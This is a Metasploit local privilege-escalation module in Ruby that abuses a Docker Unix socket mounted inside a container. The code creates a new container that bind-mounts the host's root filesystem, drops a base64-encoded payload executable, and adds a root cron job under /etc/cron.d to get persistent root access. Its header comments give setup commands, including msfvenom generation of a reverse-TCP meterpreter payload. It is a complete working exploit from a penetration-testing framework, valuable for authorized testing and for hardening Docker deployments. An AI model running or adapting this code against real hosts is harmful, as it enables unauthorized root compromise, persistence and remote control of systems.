##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking
  require 'json'
  include Msf::Post::Linux::System
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::Linux::Priv

  # Create the vulnerable image
  # sudo docker run --rm -v /var/run/docker.sock:/var/run/docker.sock --name alpine-vulnerable alpine tail -f /dev/null
  # sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > pl.elf
  # sudo docker cp pl.elf alpine-vulnerable:/pl.elf && sudo docker exec alpine-vulnerable sh -c 'chmod +x /pl.elf && /pl.elf'
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Docker Unix Socket Privilege Escalation',
      'Description'    => %q(
        Communication with the Docker daemon can happen through a Unix socket
        located at /var/run/docker.sock. When docker-containers need to
        communicate with the Docker daemon, this socket is sometimes mounted
        as a volume inside the container. Any user who can communicate with
        the Unix socket can achieve root-access on the host system. This
        module achieves root-access by first creating a new container and
        mounting the hosts file system with write access, it then adds a new
        file in /etc/cron.d/ on the host file system.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => ['Robin Stenvi'],
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],
      'Targets'        =>
        [
          ['Automatic', {}],
          ['alpine', {}],
          ['debian', {}]
        ],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'DefaultOptions'   => { 'WfsDelay' => 180 },
      'DisclosureDate' => "Apr 8 2018",   # The date this module was published
      'DefaultTarget'  => 0
    ))
    register_advanced_options([
      OptString.new("ExecutableDir", [true, "A directory on the host system where we can write the executable file", "/bin"]),
      OptString.new("MountPoint", [true, "Where to mount the host file system in the container", "/host"]),
      OptString.new('DockerImage', [true, 'Docker image to use', 'alpine:latest']),
      OptString.new("CronPath", [true, "Where to place the cron-job", "/etc/cron.d"])
    ])

    register_options([
      OptString.new('SOCKET', [true, 'Path to Docker socket', '/var/run/docker.sock'])
    ])
  end

  def get_distro
    if target.name == "Automatic"
      info = get_sysinfo
      ver = info[:version].downcase
      if ver.include?("alpine")
        return "alpine"
      elsif ver.include?("debian") || ver.include?("ubuntu")
        return "debian"
      else
        return nil
      end
    else
      return target.name
    end
  end

  def command2package(tool, dist)
    ins = ""
    rem = ""
    case dist
    when "alpine"
      ins = "apk add --update "
      rem = "apk del "
    when "debian"
      # Path is not set appropriately when using shell (PATH is not necessary
      # when using meterpreter)
      ins = "apt-get update && PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin apt-get install -y "
      rem = "apt-get remove -y "
    else
      return nil, nil
    end
    case tool
    when "curl"
      ins = "#{ins}#{tool}"
      rem = "#{rem}#{tool}"
    end
    return ins, rem
  end

  def tool_available(tool)
    res = cmd_exec('which ' + tool)
    if res.include?(tool)
      return true
    end
    return false
  end

  def install_tool(tool)
    ins, rem = command2package(tool, get_distro)
    if !ins.nil?
      vprint_status('Running command: ' + ins)
      cmd_exec(ins)
    end
    return rem
  end

  def check
    def socket_exist
      sock = datastore['SOCKET'].to_s
      res = cmd_exec("ls #{sock}")
      if res.include?("No such file")
        return false
      end
      true
    end

    if !socket_exist
      vprint_error("Unable to find socket at: #{datastore['SOCKET']}")
      return Exploit::CheckCode::Safe
    elsif is_root? || tool_available("curl")
      return Exploit::CheckCode::Appears
    else
      vprint_error("Unable to become root or locate the necessary tools")
      return Exploit::CheckCode::Detected
    end
  end

  def exploit
    # Check if the necessary tools are available
    # The same exploit can be accomplished without curl, but only curl is
    # implemented here

    res = tool_available("curl")
    if res == false
      remove = install_tool("curl")
      if tool_available("curl") == false
        fail_with(Failure::Unknown, "Unable to install necessary tools")
      end
    else
      remove = nil
    end
    vprint_status("All the necessary tools are available")

    # Generate the payload and encode as base64 because we use it in an echo
    pl = generate_payload_exe
    pl_encoded = Rex::Text.encode_base64(pl)
    exe_path = "#{datastore['ExecutableDir']}/#{rand_text_alpha(rand(6..11))}"
    docker_exe_path = "#{datastore['MountPoint']}#{exe_path}"

    # Generate the cronjob payload and encode it as base64
    cronjob2 = "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * * root #{exe_path}\n"
    cronjob_enc = Rex::Text.encode_base64(cronjob2)
    cronjob_host = "#{datastore['CronPath']}/#{rand_text_alpha(rand(6..11))}"
    cronjob = "#{datastore['MountPoint']}/#{cronjob_host}"

    # Create the various commands that should be executed inside the Docker container
    cronjob_cmd = "echo #{cronjob_enc}|base64 -d>#{cronjob}"
    cmd_payload1 = "echo #{pl_encoded}|base64 -d>#{docker_exe_path}"
    cmd_payload2 = "chmod +x #{docker_exe_path}"

    # Put the payloads together
    full_payload = "#{cmd_payload1}&&#{cmd_payload2}&&#{cronjob_cmd}"

    # Structure to start a new container
    container_start = {
      "Image" => datastore['DockerImage'].to_s,
      "Cmd" => ["tail", "-f", "/dev/null"],
      "Volumes" => { "/host": {} },
      "Hostconfig" => { "Binds": ["/:/host"] }
    }
    data_start = container_start.to_json

    # Structure to create a command
    container_execute = {
      'AttachStdin' => false,
      'AttachStdout' => true,
      'AttachStderr' => true,
      'Tty' => false,
      'Cmd' => ["/bin/sh", "-c", full_payload.to_s]
    }
    data_exec = container_execute.to_json

    # Structure to execute an already created command
    container_start_exec = {
      "Detach" => false,
      "Tty" => false
    }
    data_exec_start = container_start_exec.to_json

    # Get key after output from Docker
    cmd_prepend = "curl --silent --unix-socket #{datastore['SOCKET']} -X POST -H 'Content-Type: application/json' http://v1.24"
    cmd_prepend_del = "curl --silent --unix-socket #{datastore['SOCKET']} -X DELETE -H 'Content-Type: application/json' http://v1.24"

    # Create the container and get its ID
    cmd1 = "#{cmd_prepend}/containers/create -d '#{data_start}'"
    res = cmd_exec(cmd1)
    json = JSON.parse(res)
    contid = json["Id"]
    vprint_status("Created container and retrieved ID: #{contid}")

    # Start the container
    cmd2 = "#{cmd_prepend}/containers/#{contid}/start"
    cmd_exec(cmd2)
    vprint_status("Starting container with ID: '#{contid}'")

    # Create the exec-command and get its id
    cmd3 = "#{cmd_prepend}/containers/#{contid}/exec -d '#{data_exec}'"
    res = cmd_exec(cmd3)
    json = JSON.parse(res)
    execid = json["Id"]
    vprint_status("Created exec command and retrieved ID: '#{execid}'")

    # Execute the created command
    cmd4 = "#{cmd_prepend}/exec/#{execid}/start -d '#{data_exec_start}' --output - "
    cmd_exec(cmd4)
    vprint_status("Executed command with ID: '#{execid}'")

    # Delete the created container
    cmd_rem = "#{cmd_prepend_del}/containers/#{contid}?force=true"
    cmd_exec(cmd_rem)
    vprint_status("Removing container with ID: '#{contid}'")

    if !remove.nil?
      vprint_status("Running command: '#{remove}'")
      cmd_exec(remove)
    end

    # Register for cleanup
    vprint_status("Registering file for cleanup: '#{exe_path}'")
    register_file_for_cleanup(exe_path)

    vprint_status("Registering file for cleanup: '#{cronjob_host}'")
    register_file_for_cleanup(cronjob_host)

    vprint_status("Waiting for payload to trigger (#{datastore['WfsDelay']} seconds)")
  end
end
